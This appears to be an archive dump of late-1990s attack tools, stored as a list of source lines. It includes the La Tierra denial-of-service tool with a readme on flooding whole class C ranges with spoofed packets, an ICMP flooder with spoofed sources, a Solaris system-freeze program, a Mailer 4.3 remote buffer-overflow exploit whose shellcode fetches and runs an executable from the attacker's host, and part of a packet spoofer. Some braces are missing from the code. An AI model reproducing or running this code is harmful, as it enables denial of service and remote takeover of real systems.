            "\tprintf(\"                Alternatives = zone=filename.txt or list=filename.txt (ASCII)\\n\");",
            "\tprintf(\"                For list of alternative options, use  -a instead of -h.\\n\");",
            "\tprintf(\"     *   -b port# = beginning port number (required).\\n\");",
            "        printf(\"         -e port# = ending port number (optional)\\n\");",
            "\tprintf(\"         -t = tcp flag options (f=fin,~s=syn,r=reset,~p=push,a=ack,u=urgent)\\n\");",
            "\tprintf(\"         -v = time_to_live value, default=%d\\n\", DEFAULT_TTL);",
            "\tprintf(\"         -p protocol = ~6=tcp, 17=udp, use -p option for complete list\\n\");",
            "\tprintf(\"         -w window_size = value from 0 to ?, default=%d\\n\", DEFAULT_WINSIZE);",
            "\tprintf(\"         -q tcp_sequence_number, default=%d\\n\", DEFAULT_SEQ);",
            "\tprintf(\"         -m message_type (~0=none,1=Out-Of-Band,4=Msg_DontRoute\\n\");",
            "\tprintf(\"         -s seconds = delay between port numbers, default=%d\\n\", DEFAULT_FREQUENCY);",
            "\tprintf(\"         -o 1 = supress additional output to screen, default=0\\n\" );",
            "\tprintf(\"         -l loop = times to loop through ports/scan, default=%d, %d=forever\\n\", 1, FOR_EVER);",
            "\tprintf(\"     * = required     ~ = default parameter values\\n\\n\");",
            "\texit(-1);",
            "/* End of file */",
            "/*----------------- readme.txt  ------------------------------",
            "La Tierra v1.0b  - by MondoMan (KeG), elmondo@usa.net",
            "       Modified version of land.c by m3lt, FLC",
            "To compile latierra, type:",
            "\tgcc latierra.c -o latierra",
            "\tTo see the help screen, use 'latierra -h'",
            "This program crashes Windows 95, and will cause Windows NT  ",
            "4.0, SP3 to utilize a high percentage of CPU.  In some     ",
            "instances, CPU usage reaches %100.",
            "                                                         ",
            "land.c description:                                        ",
            "land.c sends a spoofed packet with the SYN flag from the   ",
            "the same IP and port number as the destination.  For       ",
            "example, if you want to do a DoS on 1.1.1.1, port 80, it would   ",
            "spoof 1.1.1.1 port 80 as the source.  The problem is with  ",
            "NT4 SP3, however, is once you issue this packet to a     ",
            "port, NT4 SP3 appears to ignore all other attempts -",
            "UNTIL ...",
            "                                                            ",
            "                     La Tierra!",
            "                                                            ",
            "La Tierra description:                                     ",
            "                                                            ",
            "La Tierra basically works by sending NT the same packet",
            "used in land.c but to more than one port (if specified).",
            "It doesn't appear to matter if the port is opened or closed!",
            "NT doesn't appear to let this happen again on the same port",
            "successively, but you simply change ports, and you can easily ",
            "go back to the original port and it'll work again. What's even",
            "more interesting is the fact that port 139 works with this.",
            "You would have thought - I'll leave that alone for now!",
            "While testing, I used a Compaq dual Intel Pentium Pro 200, and",
            "was able to take up to %64 CPU.  With one processor disabled, ",
            "CPU usage was %100.  NT4 SP3 doesn't seem to crash, just needs",
            "time to recover, even with one spoofed packet.",
            "Features include:",
            "\t- Ability to launch a DoS on an entire class C address",
            "\t- Specify the beginning and ending port range",
            "\t- Specify the number of loops or make it loop forever!",
            "\t- User defined TCP flags: fin, syn, reset, push, ack, ",
            "\t  and urgent",
            "\t- Other IP options such as window size, time-to-live, ",
            "\t  sequence_number, and message_type",
            "\t- Ability to read a DNS zone file for IP addresses",
            "\t- Ability to read a ASCII file containing IP addresses",
            "Command line options:",
            "     - i ip_address",
            "\tDEFAULT: None",
            "\tRANGE: Valid IP Address",
            "\tOPTIONAL: No",
            "\twhere ip_address is a valid ip_address, or if you wish to",
            "\tcycle through a class C address, the last octet is dropped",
            "        and replaced with a '-'.  This option is required.  The ",
            "\tsource and destination address are obtained from this value.",
            "\tRather than specifying an IP address, you may wish to create",
            "        an ASCII file, or better yet, use nslookup to obtain all ",
            "        zone information for a particular domain.  The ASCII file",
            "\tsimply contains a list of IP addresses, one on each line.",
            "\tTo get a DNS file, simply use nslookup, and the ",
            "\t\"ls -d somedomain.com > filename.txt\" command.  You can use",
            "\t'latierra -n' to read more about the command sequence for",
            "\tnslookup.",
            "\tIn both types of files, lines that begin with ';' or '[' are ",
            "\tignored. In DNS files, only 'A' records are processed.",
            "\tExamples:",
            "\t   Single IP Address:",
            "\t\t-i 10.1.2.1",
            "\t   Class C range:",
            "\t\t-i 10.1.2.-",
            "\t   ASCII file:",
            "\t\t-i list=filename.txt",
            "\t   DNS file:",
            "\t\t-i zone=filename.txt",
            "     -b beginning_port_number",
            "\tDEFAULT: None",
            "\tRANGE: Positive Integer",
            "\tOPTIONAL: No",
            "\twhere this value is the port_number that latierra will use. If",
            "\tno ending_port_number is specified, ending_port_number is then",
            "\tequal to this value.  Valid range is 1 to 0xFFFF",
            "     -e ending_port_number",
            "\tDEFAULT: If not specified, equal to beginning_port_number",
            "\tRANGE: Positive Integer",
            "\tOPTIONAL: Yes",
            "\tis the highest port number in the range to cycle through. ",
            "\tExample:",
            "\t\t-i 10.1.2.1 -b 23 -e 80",
            "\twill start at port 23 and increment up to port 80.  You can ",
            "        delay the next increment by using the -s option.  Valid range",
            "\tis 1 to 0xFFFF",
            "     -s seconds_between_spoofs",
            "\tDEFAULT: 1",
            "\tRANGE: Positive Integer",
            "\tOPTIONAL: Yes",
            "\tYou may want to control the seconds between spoofs.  If you",
            "        specify a zero, no delays occur.",
            "\tIn the below example, the spoof will between ports 23 and 80,",
            "\tevery 3 seconds.",
            "\t\t-i 10.1.2.1 -b 23 -e 80 -s 3",
            "     -l number_of_loops",
            "\tDEFAULT: 1",
            "\tRANGE: Positive Integer, -5 loops forever",
            "\tOPTIONAL: Yes",
            "\tThis option if set greater than 1, will cause a repeat of the",
            "        cycle.  For example:",
            "\t\t-i 10.1.2.1 -b 23 -e 80 -s 0 -l 8",
            "\twill cause latierra to go through ports 23 through 80 and",
            "\trepeat the process 8 times, with no delay.  Look at the",
            "\tfollowing example:",
            "\t\t-i 10.1.2.- -b 23 -e 80 -s 0 -l 8",
            "\tlatierra will start at 10.1.2.1, port 23 through 80, then",
            "\tincrement to 10.1.2.2, port 23 through 80, and so on until",
            "\tit gets to 10.1.2.254, in which case it will repeat the",
            "\tsame procedure over again 8 times.",
            "\tBy specifying a value of -5 for this option, latierra will",
            "\tloop forever, until you manually stop the process.  In the",
            "\tlast example above, the procedure would never end.  When it",
            "\treaches 10.1.2.254, it falls back to 10.1.2.1 and start",
            "\tover again from there.",
            "\tOther examples:",
            "\t\t-i 10.1.2.1 -b 139 -s 0 -l -5",
            "\t\t-i 10.1.2.- -b 80 -s 5 -l 10",
            "                                                      ",
            "     -t tcp_flags",
            "\tDEFAULT: sp   (SYN, PUSH)",
            "\tRANGE: valid character set (see below)",
            "\tOPTIONAL: Yes",
            "\tthis option sets the various TCP flags, which include:",
            "\t\tf = fin\t\ts = syn\t\tr = reset",
            "\t\tp = push\ta = ack\t\tu = urgent",
            "\tExample:",
            "\t\t-i 10.1.2.1 -b 139 -t apu -s 0",
            "\t\tTo set the ack, push, and urgent flag",
            "     -v time_to_live_value",
            "\tDEFAULT: 0xFF (255 decimal)",
            "\tRANGE: Positive Integer",
            "\tOPTIONAL: Yes",
            "\tSets the time to live value.",
            "     -p protocol_value",
            "\tDEFAULT: 6 (tcp)",
            "\tRANGE: Positive Integer",
            "\tOPTIONAL: Yes",
            "\tSets the protocol value in the IP header.  To see a list of ",
            " \tavailable protocols, run \"latierra -p\".",
            "     -w window_size_value",
            "\tDEFAULT: 0xFFFF (65000 decimal)",
            "\tRANGE: Positive long value",
            "\tOPTIONAL: Yes",
            "     -q tcp_sequence_number_value",
            "\tDEFAULT: 0xF1C",
            "\tRANGE: Positive integer",
            "\tOPTIONAL: Yes",
            "     -o 1 supress_additional_output",
            "\tDEFAULT: messages are printed for status",
            "\tRANGE: None",
            "\tOPTIONAL: Yes",
            "\tIf you don't want to see the messages during the process,",
            "\tsimply use this \"-o 1\" to turn them off.",
            "Final Note:",
            "Please use this program for in-house testing purposes only.  ",
            "Just because your sending spoofed packets, doesn't mean you ",
            "can't be traced.",
            "Good luck.",
            "- MondoMan",
            "elmondo@usa.net",
            "                                                          ",
            "-------------------- end of file -------------------------------",
            "datapool/src/linux-icmp.c",
            "0100644",
            "0000000",
            "0000000",
            "00000004746",
            "07071420540",
            "014412",
            "ustar  ",
            "root",
            "root",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <arpa/inet.h>",
            "#include <errno.h>",
            "#include <unistd.h>",
            "#include <netdb.h>",
            "struct icmp_hdr",
            "    struct iphdr iph;",
            "    struct icmp icp;",
            "    char text[1002];",
            "} icmph;",
            "int in_cksum(int *ptr, int nbytes)",
            "    long sum;",
            "    u_short oddbyte, answer;",
            "    sum = 0;",
            "    while (nbytes > 1)",
            "    {",
            "\tsum += *ptr++;",
            "\tnbytes -= 2;",
            "    }",
            "    if (nbytes == 1)",
            "    {",
            "\toddbyte = 0;",
            "\t*((u_char *)&oddbyte) = *(u_char *)ptr;",
            "\tsum += oddbyte;",
            "    }",
            "    sum = (sum >> 16) + (sum & 0xffff);",
            "    sum += (sum >> 16);",
            "    answer = ~sum;",
            "    return(answer);",
            "struct sockaddr_in sock_open(char *address, int socket, int prt)",
            "\tstruct hostent *host;",
            "\tif ((host = gethostbyname(address)) == NULL)",
            "\t\tperror(\"Unable to get host name\");",
            "\t\texit(-1);",
            "void main(int argc, char **argv)",
            "\tint sock, i, ctr, k;",
            "\tint on = 1;",
            "\tstruct sockaddr_in addrs;",
            "\tif (argc < 3)",
            "\t\tprintf(\"Usage: %s <ip_addr> <port>\\n\", argv[0]);",
            "\t\texit(-1);",
            "\tfor (i = 0; i < 1002; i++)",
            "\t    icmph.text[i] = random() % 255;",
            "\tsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "\tif (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)",
            "\t    perror(\"Can't set IP_HDRINCL option on socket\");",
            "\tif (sock < 0)",
            "\t    exit(-1);",
            "\tfflush(stdout);",
            "\tfor (ctr = 0;ctr < 1001;ctr++)",
            "\t    ctr = ctr % 1000;",
            "            addrs = sock_open(argv[1], sock, atoi(argv[2]));",
            "\t    icmph.iph.version = 4;",
            "\t    icmph.iph.ihl = 6;",
            "\t    icmph.iph.tot_len = 1024;",
            "\t    icmph.iph.id = htons(0x001);",
            "\t    icmph.iph.ttl = 255;",
            "\t    icmph.iph.protocol = IPPROTO_ICMP;",
            "\t    icmph.iph.saddr = ((random() % 255) * 255 * 255 * 255) +",
            "\t    ((random() % 255) * 65535) +",
            "\t    ((random() % 255) * 255) +",
            "\t    (random() % 255);",
            "\t    icmph.iph.daddr = addrs.sin_addr.s_addr;",
            "\t    icmph.iph.frag_off = htons(0);",
            "\t    icmph.icp.icmp_type = random() % 14;",
            "\t    icmph.icp.icmp_code = random() % 10;",
            "\t    icmph.icp.icmp_cksum = 0;",
            "\t    icmph.icp.icmp_id = 2650;",
            "\t    icmph.icp.icmp_seq = random() % 255;",
            "\t    icmph.icp.icmp_cksum = in_cksum((int *)&icmph.icp, 1024);",
            "\t    if (sendto(sock, &icmph, 1024, 0, (struct sockaddr *)&addrs, sizeof(struct sockaddr)) == -1)",
            "\t    {",
            "\t    \tif (errno != ENOBUFS) printf(\"X\");",
            "\t    }",
            "\t    if (ctr == 0) printf(\"b00m \");",
            "\t    fflush(stdout);",
            "\tclose(sock);",
            "datapool/src/locktcp.c",
            "0100644",
            "0000000",
            "0000000",
            "00000005204",
            "07100102277",
            "013747",
            "ustar  ",
            "root",
            "root",
            " * The folowing is rather ripped from Pine 3.95, and condensed.",
            " * It should easily freeze a Solaris/x86 2.5.1 system, though may have to",
            " * be run more than once to produce the problem.",
            " * Compile with: [g]cc -o locktcp locktcp.c -lsocket -lnsl",
            " * Throw this at your favorite dotted decimal IP and port of some server",
            " * (not on the local host) that throws up a banner message. i.e. IMAP,",
            " * POP3, FTP, etc.  The program doesn't seem to hang the system on",
            " * services that don't throw a banner (like HTTP).",
            " * Usage: locktcp ip-addr port",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <fcntl.h>",
            "#include <errno.h>",
            "int main(int argc, char **argv) {",
            "  int i,sock,flgs;",
            "  char *s;",
            "  struct sockaddr_in sin;",
            "  fd_set fds;",
            "  char tmp[4096];",
            "  char *host;",
            "  long port;",
            "  if (argc != 3) {",
            "    fprintf(stderr, \"Usage: %s ip-addr port\\n\", argv[0]);",
            "    return 1;",
            "  host = argv[1];",
            "  port = atol(argv[2]);",
            "/**** Set up address and open socket ****/",
            "  sin.sin_port = htons (port);",
            "  sin.sin_addr.s_addr = inet_addr (host);",
            "  sin.sin_family = AF_INET;\t/* family is always Internet */",
            "  if ((sock = socket (sin.sin_family,SOCK_STREAM,IPPROTO_IP)) < 0) {",
            "    fprintf (stderr,\"Unable to create TCP socket: %s\\n\",strerror (errno));",
            "    return 0;",
            "/**** Set to non-blocking ****/",
            "  flgs = fcntl (sock,F_GETFL,0);/* get current socket flags */",
            "  fcntl (sock,F_SETFL,flgs | O_NDELAY);",
            "/**** Connect to host ****/",
            "  while ((i = connect (sock,(struct sockaddr *) &sin,sizeof (sin))) < 0 &&",
            "\t errno == EINTR);",
            "  if (i < 0) switch (errno) {\t/* failed? */",
            "  case EINPROGRESS:",
            "  case EISCONN:",
            "  case EADDRINUSE:",
            "    break;\t\t\t/* well, not really, it was interrupted */",
            "  default:",
            "    fprintf (stderr,\"Can't connect to %.80s,%d: %s\\n\",host,port,",
            "\t     strerror (errno));",
            "    close (sock);\t\t/* flush socket */",
            "    return 0;",
            "/**** Do blocking select on nonblocking socket ****/",
            "  FD_ZERO (&fds);\t\t/* initialize selection vector */",
            "  FD_SET (sock,&fds);\t\t/* block for writeable */",
            "  while (((i = select (sock+1,NULL,&fds,NULL,NULL)) < 0) &&",
            "\t (errno == EINTR));",
            "/**** Set back to blocking socket ****/",
            "  if (i > 0) {\t\t\t/* success, make sure really connected */",
            "    fcntl (sock,F_SETFL,flgs);\t/* restore blocking status */",
            "\t\t\t\t/* get socket status */",
            "    while ((i = read (sock,tmp,0)) < 0 && errno == EINTR); /*** XXX--BOOM ***/",
            "    if (!i) i = 1;\t\t/* make success if the read is OK */",
            "  }\t",
            "  if (i <= 0) {\t\t\t/* timeout or error? */",
            "    fprintf (stderr,\"Can't connect to %.80s,%d: %s\\n\",host,port,",
            "\t     strerror (i ? errno : ETIMEDOUT));",
            "    close (sock);\t\t/* flush socket */",
            "  return 0;",
            "datapool/src/mailer.c",
            "0100644",
            "0000000",
            "0000000",
            "00000012501",
            "07076066136",
            "013576",
            "ustar  ",
            "root",
            "root",
            "   Remote exploit for Mailer 4.3 - Win 9x/NT (PRIVATE DO NOT DISTRIBUTE)",
            "   Author: Cybz    (8. dec '99)",
            "   Try offsets +600 to +800",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <unistd.h>",
            "#define BUF_SIZE\t3412",
            "#define PORT\t\t110",
            "#define OFFSET\t\t674",
            "char shellcode[701] = {",
            "   0xEB,0x58,0x5F,0x32,0xC0,0x8B,0xDF,0x33,0xC9,0xB1,0x09,0xFE,0xC1,0x03,0xD9,0x88,",
            "   0x03,0x88,0x47,0x16,0x88,0x47,0x21,0x88,0x47,0x28,0x88,0x47,0x30,0x88,0x47,0x35,",
            "   0x88,0x47,0x41,0x88,0x47,0x47,0x88,0x47,0x4E,0x88,0x47,0x55,0x88,0x47,0x58,0x88,",
            "   0x47,0x5E,0x88,0x47,0x65,0x88,0x47,0x6A,0x8B,0xC7,0x50,0xB8,0x50,0x77,0xF7,0xBF,",
            "   0xFF,0xD0,0x89,0x47,0x6E,0x8B,0xC7,0x33,0xC9,0xB1,0x0B,0x03,0xC1,0x50,0xB8,0x50,",
            "   0x77,0xF7,0xBF,0xFF,0xD0,0x89,0x47,0x72,0xEB,0x02,0xEB,0x72,0x8B,0xC7,0x33,0xC9,",
            "   0xB1,0x17,0x03,0xC1,0x50,0xFF,0x77,0x72,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,",
            "   0xF0,0x8B,0xC7,0x33,0xC9,0xB1,0x82,0x03,0xC1,0x50,0x33,0xC0,0xB0,0x02,0x50,0xFF,",
            "   0xD6,0x57,0x33,0xC9,0xB1,0x82,0x03,0xF9,0x33,0xC9,0x66,0xB9,0x90,0x01,0x33,0xC0,",
            "   0xF3,0xAA,0x5F,0x8B,0xC7,0x33,0xC9,0xB1,0x22,0x03,0xC1,0x50,0xFF,0x77,0x72,0xB8,",
            "   0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x33,0xC0,0x50,0x40,0x50,0x40,0x50,0xFF,",
            "   0xD6,0x89,0x47,0x76,0x8B,0xDF,0x33,0xC9,0xB1,0x82,0x03,0xD9,0xC6,0x03,0x02,0x66,",
            "   0xC7,0x43,0x02,0x1B,0x58,0xC7,0x43,0x04,0xEE,0xEE,0xEE,0xEE,0xEB,0x02,0xEB,0x56,",
            "   0x8B,0xC7,0x33,0xC9,0xB1,0x29,0x03,0xC1,0x50,0xFF,0x77,0x72,0xB8,0x28,0x6E,0xF7,",
            "   0xBF,0xFF,0xD0,0x8B,0xF0,0x33,0xC0,0xB0,0x10,0x50,0x8B,0xC7,0x33,0xC9,0xB1,0x82,",
            "   0x03,0xC1,0x50,0xFF,0x77,0x76,0xFF,0xD6,0x8B,0xC7,0x33,0xC9,0xB1,0x42,0x03,0xC1,",
            "   0x50,0xFF,0x77,0x6E,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x8B,0xC7,0x33,",
            "   0xC9,0xB1,0x56,0x03,0xC1,0x50,0x8B,0xC7,0x33,0xC9,0xB1,0x59,0x03,0xC1,0x50,0xFF,",
            "   0xD6,0x89,0x47,0x7A,0xEB,0x02,0xEB,0x63,0x8B,0xC7,0x33,0xC9,0xB1,0x31,0x03,0xC1,",
            "   0x50,0xFF,0x77,0x72,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x33,0xC0,0x50,",
            "   0x66,0xB8,0xE8,0x03,0x50,0x8B,0xC7,0x33,0xC9,0xB1,0x82,0x03,0xC1,0x50,0xFF,0x77,",
            "   0x76,0xFF,0xD6,0x89,0x47,0x7E,0x33,0xDB,0x3B,0xC3,0x74,0x31,0x72,0x2F,0x8B,0xC7,",
            "   0x33,0xC9,0xB1,0x48,0x03,0xC1,0x50,0xFF,0x77,0x6E,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,",
            "   0xD0,0x8B,0xF0,0xFF,0x77,0x7A,0xFF,0x77,0x7E,0x33,0xC0,0xB0,0x01,0x50,0x8B,0xC7,",
            "   0x33,0xC9,0xB1,0x82,0x03,0xC1,0x50,0xFF,0xD6,0xEB,0x9D,0xEB,0x6C,0x8B,0xC7,0x33,",
            "   0xC9,0xB1,0x36,0x03,0xC1,0x50,0xFF,0x77,0x72,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,",
            "   0x8B,0xF0,0xFF,0x77,0x76,0xFF,0xD6,0x8B,0xC7,0x33,0xC9,0xB1,0x4F,0x03,0xC1,0x50,",
            "   0xFF,0x77,0x6E,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0xFF,0x77,0x7A,0xFF,",
            "   0xD6,0x8B,0xC7,0x33,0xC9,0xB1,0x5F,0x03,0xC1,0x50,0xFF,0x77,0x6E,0xB8,0x28,0x6E,",
            "   0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x8B,0xC7,0x33,0xC9,0xB1,0x59,0x03,0xC1,0x50,0xFF,",
            "   0xD6,0x8B,0xC7,0x33,0xC9,0xB1,0x66,0x03,0xC1,0x50,0xFF,0x77,0x6E,0xB8,0x28,0x6E,",
            "   0xF7,0xBF,0xFF,0xD0,0x33,0xDB,0x53,0xFF,0xD0,0x90,0xE8,0x03,0xFE,0xFF,0xFF,0x6D,",
            "   0x73,0x76,0x63,0x72,0x74,0x2E,0x64,0x6C,0x6C,0x2C,0x77,0x73,0x6F,0x63,0x6B,0x33,",
            "   0x32,0x2E,0x64,0x6C,0x6C,0x2C,0x57,0x53,0x41,0x53,0x74,0x61,0x72,0x74,0x75,0x70,",
            "   0x2C,0x73,0x6F,0x63,0x6B,0x65,0x74,0x2C,0x63,0x6F,0x6E,0x6E,0x65,0x63,0x74,0x2C,",
            "   0x72,0x65,0x63,0x76,0x2C,0x63,0x6C,0x6F,0x73,0x65,0x73,0x6F,0x63,0x6B,0x65,0x74,",
            "   0x2C,0x66,0x6F,0x70,0x65,0x6E,0x2C,0x66,0x77,0x72,0x69,0x74,0x65,0x2C,0x66,0x63,",
            "   0x6C,0x6F,0x73,0x65,0x2C,0x77,0x62,0x2C,0x78,0x2E,0x65,0x78,0x65,0x2C,0x73,0x79,",
            "   0x73,0x74,0x65,0x6D,0x2C,0x65,0x78,0x69,0x74,0x2C,0x2C,0x2C,0x2C,0x00 };",
            "int     main(int argc,char *argv[])",
            "        char buf[BUF_SIZE];",
            "        struct hostent *info;",
            "        struct sockaddr_in server;",
            "        int fd,i;",
            "        unsigned int ip,port,yourip;",
            "        if (argc < 3) {",
            "            printf(\"usage: %s <victim> <you>\\n\", argv[0]);",
            "            exit(1);",
            "        }",
            "        if ((yourip=inet_addr(argv[2]))==-1){",
            "            if ((info=gethostbyname(argv[2]))==NULL){",
            "                printf(\"Unable to resolve local hostname.\\n\");",
            "                exit(1);",
            "            }",
            "            memcpy((caddr_t)&yourip,info->h_addr,info->h_length);",
            "        }",
            "        bzero(&server, sizeof(server));",
            "        server.sin_family = AF_INET;",
            "        server.sin_port = htons(PORT);",
            "        if ((server.sin_addr.s_addr=inet_addr(argv[1]))==-1){",
            "            if ((info=gethostbyname(argv[1]))==NULL){",
            "                printf(\"Can not resolve specified VictimHost.\\n\");",
            "                exit(1);",
            "            }",
            "            server.sin_family = info->h_addrtype;",
            "            memcpy((caddr_t)&server.sin_addr.s_addr,info->h_addr,info->h_length);",
            "        }",
            "        if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0){",
            "            perror(\"socket\");  exit(0);",
            "        }",
            "        if(connect(fd, (struct sockaddr *)&server, sizeof(server)) < 0){",
            "            perror(\"connect\"); exit(0);",
            "        }",
            "        while((i=read(fd,buf,sizeof(buf))) > 0){",
            "            buf[i]=0;",
            "            if(strchr(buf,'\\n')!=NULL) break;",
            "        }",
            "        memset(buf,0x90,BUF_SIZE);",
            "        for (i=267;i<271;i++) buf[i]=0x30;",
            "        ip=htonl(yourip);",
            "        memcpy(buf+OFFSET+4,shellcode,strlen(shellcode));",
            "        buf[BUF_SIZE]=0;",
            "        sprintf(buf,\"RCPT TO: %s\\r\\n\",buf);",
            "        write(fd,buf,strlen(buf));",
            "        close(fd);",
            "/*                        www.hack.co.za                    */",
            "datapool/src/misfrag.c",
            "0100644",
            "0000000",
            "0000000",
            "00000017651",
            "07100655535",
            "013763",
            "ustar  ",
            "root",
            "root",
            "       /*--------- code ----------- */",
            "       #define _BSD_SOURCE",
            "       /* BSD compatibility */",
            "       #include <stdio.h>",
            "       #include <stdlib.h>",
            "       #include <unistd.h>",
            "       #include <string.h>",
            "       #include <netdb.h>",
            "       #include <net/if.h>",
            "       #include <netinet/in.h>",
            "       #include <netinet/ip.h>",
            "       #include <netinet/tcp.h>",
            "       #include <sys/ioctl.h>",
            "       #include <sys/types.h>",
            "       #include <sys/socket.h>",
            "       #include <arpa/inet.h>",
            "       #include <time.h>",
            "       ",
            "       struct pseudo {",
            "               u_long saddr;",
            "               u_long daddr;",
            "               u_char zero;",
            "               u_char protocol;",
            "               u_short length;",
            "       };",
            "       ",
            "       unsigned short",
            "       in_cksum (unsigned short *ptr, int nbytes)",
            "       {",
            "       ",
            "         register long sum;            /* assumes long == 32 bits */",
            "         u_short oddbyte;",
            "         register u_short answer;      /* assumes u_short == 16 bits */",
            "       ",
            "         /*",
            "          * Our algorithm is simple, using a 32-bit accumulator (sum),",
            "          * we add sequential 16-bit words to it, and at the end, fold back",
            "          * all the carry bits from the top 16 bits into the lower 16 bits.",
            "          */",
            "       ",
            "         sum = 0;",
            "         while (nbytes > 1)",
            "           {",
            "             sum += *ptr++;",
            "             nbytes -= 2;",
            "           }",
            "       ",
            "         /* mop up an odd byte, if necessary */",
            "         if (nbytes == 1)",
            "           {",
            "             oddbyte = 0;              /* make sure top half is zero */",
            "             *((u_char *) & oddbyte) = *(u_char *) ptr;        /* one byte only */",
            "             sum += oddbyte;",
            "           }",
            "       ",
            "         /*",
            "          * Add back carry outs from top 16 bits to low 16 bits.",
            "          */",
            "       ",
            "         sum = (sum >> 16) + (sum & 0xffff);   /* add high-16 to low-16 */",
            "         sum += (sum >> 16);           /* add carry */",
            "         answer = ~sum;                /* ones-complement, then truncate to 16 bits */",
            "         return (answer);",
            "       }",
            "       ",
            "       int sendpack( int s, u_long srcaddr, u_short srcport, u_long dstaddr, u_short dstport,u_short th_flags, u_char *packet,u_long length) {",
            "       ",
            "               u_char packet[sizeof(struct ip) + sizeof(struct pseudo) + sizeof(struct tcphdr)];",
            "               struct sockaddr_in foo;",
            "               struct in_addr srcinaddr,dstinaddr;",
            "               struct ip *ip = (struct ip *) packet;",
            "               struct pseudo *pseudo = (struct pseudo *) (packet + sizeof(struct ip));",
            "               struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ip) ",
            "                                       + sizeof(struct pseudo));",
            "               bzero(packet, sizeof(packet));",
            "               bzero(&foo,sizeof(foo));",
            "       ",
            "               /* only BSD, linux has plain u_long declared */",
            "               srcinaddr.s_addr = srcaddr;",
            "               dstinaddr.s_addr = dstaddr;",
            "       ",
            "       /* building packets */",
            "                               pseudo->saddr = srcaddr;",
            "                               pseudo->daddr = dstaddr;",
            "                               pseudo->zero = 0;",
            "                               pseudo->protocol=IPPROTO_TCP;",
            "                               pseudo->length = htons(sizeof (struct tcphdr));",
            "                               ip->ip_v = 4; /* 4 */",
            "                               ip->ip_hl = 5; /* 5 */",
            "                               ip->ip_id = 1234; /* 1234 */",
            "                               ip->ip_src = srcinaddr;",
            "                               ip->ip_dst = dstinaddr;",
            "                               ip->ip_p = IPPROTO_TCP;",
            "                               ip->ip_ttl = 40; /* 40 */",
            "                               ip->ip_off = 0;",
            "                               ip->ip_len = sizeof(struct ip) + sizeof(struct tcphdr)",
            "                                                           + length;",
            "                               tcp->th_sport = htons(srcport);",
            "                               tcp->th_dport = htons(dstport);",
            "                               tcp->th_seq = htonl(rand());",
            "                               tcp->th_ack = htonl(rand());",
            "                               tcp->th_off=1;",
            "                               tcp->th_flags = th_flags;",
            "                               tcp->th_urp = 0; /* 0 */",
            "                               tcp->th_sum = in_cksum((u_short *) pseudo,",
            "                                               sizeof(struct pseudo) +",
            "                                                sizeof(struct tcphdr));",
            "                               bcopy(tcp,pseudo,sizeof(struct tcphdr));",
            "                               foo.sin_family=AF_INET;",
            "                               foo.sin_addr.s_addr=dstaddr;",
            "                               sendto(s,packet,sizeof(struct ip) + ",
            "                                               sizeof(struct tcphdr) + length, 0,",
            "                                               (struct sockaddr *) &foo,sizeof(foo));",
            "       ",
            "               return 0;",
            "       }",
            "       ",
            "       void usage(char *name) {",
            "               fprintf(stderr,\"\\x1B[0;34mP.A.T.C.H. production - misteri0\\x1B[0;0m\\n\");",
            "               fprintf(stderr,\"\\x1B[1;36mUsage: \\x1B[0;31m%s \\x1B[1;32m[\\x1B[0;36msrcip\\x1B[1;32m] \\x1B[1;32m[\\x1B[0;36msrc start port\\x1B[1;32m] \\x1B[1;32m[\\x1B[0;36mdstip\\x1B[1;32m] \\x1B[1;32m[\\x1B[0;36mdst start port\\x1B[1;32m] \\x1B[1;32m[\\x1B[0;36mcount\\x1B[1;32m]\\x1B[0;0m\\n\",name);",
            "               fprintf(stderr,\"\\x1B[0;35mNote: \\x1B[0;33mThe source/destination ports will increment by 1\\x1B[0;0m\\n\");",
            "              ",
            "               exit(1);",
            "       }",
            "       ",
            "       u_long resolve_name(char *hostname) {",
            "               struct hostent *host;",
            "               u_long addr;",
            "               if ((addr = inet_addr(hostname)) != -1) return addr;",
            "               if ((host = gethostbyname(hostname)) == NULL) {",
            "                       fprintf(stderr,\"Can not resolve name: %s\\n\",hostname);",
            "                       exit(1);",
            "               }",
            "               bcopy(host->h_addr,&addr,host->h_length);",
            "               return addr;",
            "       }",
            "       int main(argc,argv)",
            "       ",
            "               int argc;",
            "               ",
            "               char **argv;",
            "       {",
            "               int rawfd,rd,rsize;",
            "               int count; /* don't know why I made it so complicated, *sigh* oh well, gets the job done.. */",
            "               int one=1;",
            "               u_char buf[1024];",
            "               struct sockaddr_in raddr;",
            "               struct ifreq ifr;",
            "               struct in_addr srcip,dstip;",
            "               u_short srcport,dstport;",
            "       ",
            "               if (argc!=6) usage(argv[0]);",
            "               ",
            "               ",
            "               srcip.s_addr    =       resolve_name(argv[1]);",
            "               srcport         =       atoi(argv[2]);",
            "               dstip.s_addr    =       resolve_name(argv[3]);",
            "               dstport         =       atoi(argv[4]);",
            "       ",
            "               if ((rawfd=socket(PF_INET,SOCK_RAW,IPPROTO_ICMP))<0) {",
            "                       perror(\"RawSocket:\");",
            "                       exit(1);",
            "               }",
            "               if (setsockopt(rawfd,IPPROTO_IP,IP_HDRINCL,&one,sizeof(one))<0) {",
            "                       perror(\"SetSockOpt:\");",
            "                       close(rawfd);",
            "                       exit(1);",
            "               }",
            "            count=0;",
